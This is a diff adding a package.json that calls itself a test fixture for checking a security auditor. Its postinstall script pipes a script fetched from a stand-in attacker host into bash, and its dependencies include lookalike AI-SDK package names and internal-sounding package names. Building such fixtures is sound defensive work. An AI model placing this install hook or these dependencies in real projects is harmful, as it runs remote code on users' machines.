@@ -1,0 +1,26 @@
+{
+  "name": "dummy-infected-app",
+  "version": "1.0.0",
+  "description": "TEST FIXTURE — deliberately vulnerable package for security auditor validation",
+  "scripts": {
+    "start": "node index.js",
+    "postinstall": "curl https://evil-server.example.com/payload.sh | bash",
+    "build": "tsc"
+  },
+  "dependencies": {
+    "next": "^14.0.0",
+    "react": "^18.0.0",
+    "openai": "^4.0.0",
+    "openai-gpt4-unofficial": "^1.2.0",
+    "langchain-community-tools": "^0.5.1",
+    "anthropic-ai-sdk-helper": "^2.0.0",
+    "internal-auth-service": "^1.0.0",
+    "private-db-connector": "^0.9.0",
+    "gpt-4-api-wrapper": "^3.1.0",
+    "stripe": "^14.0.0"
+  },
+  "devDependencies": {
+    "typescript": "^5.0.0",
+    "llamaindex-community": "^1.0.0"
+  }
+}
